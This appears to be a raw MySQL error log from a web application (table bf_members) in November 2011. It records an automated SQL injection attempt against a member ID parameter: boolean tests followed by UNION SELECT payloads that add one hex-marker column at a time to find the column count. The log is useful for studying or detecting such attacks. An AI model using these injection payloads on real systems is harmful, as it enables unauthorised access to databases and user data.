2011-11-23 20:23:34
SQL:

message:
Can't connect to MySQL server on 'localhost' (10061)

2011-11-23 20:23:37
SQL:

message:
Can't connect to MySQL server on 'localhost' (10061)

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4  and 1=1/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:12
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e/* and 1<2
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '/* and 1<2' at line 1

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:13
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
